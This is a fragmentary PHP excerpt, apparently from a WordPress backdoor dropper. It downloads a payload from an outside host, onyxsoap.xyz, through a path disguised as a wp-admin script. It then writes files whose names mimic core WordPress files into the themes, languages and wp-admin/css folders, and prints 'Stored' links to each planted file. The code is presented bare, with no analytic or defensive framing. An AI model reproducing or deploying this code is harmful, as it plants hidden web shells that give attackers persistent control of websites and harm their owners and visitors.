...
$text1 = http_get('http://onyxsoap.xyz/wp-admin/js/widgets/main.txt');
...
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/themes/class-wp-filesystemss.php" ;
...
echo " Stored  lu : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-content/themes/class-wp-filesystemss.php\">".$_SERVER['HTTP_HOST']."/wp-content/themes/class-wp-filesystemss.php  </a>\n<br>";
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/languages/class-wp-filesystem.php" ;
...
echo " Stored : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-content/languages/class-wp-filesystem.php\">".$_SERVER['HTTP_HOST']."/wp-content/languages/class-wp-filesystem.php  </a>\n<br>";
$check4 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/class-wp.php" ;
...
echo " Stored he : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-admin/css/class-wp.php\">".$_SERVER['HTTP_HOST']."/wp-admin/css/class-wp.php  </a>\n<br>";
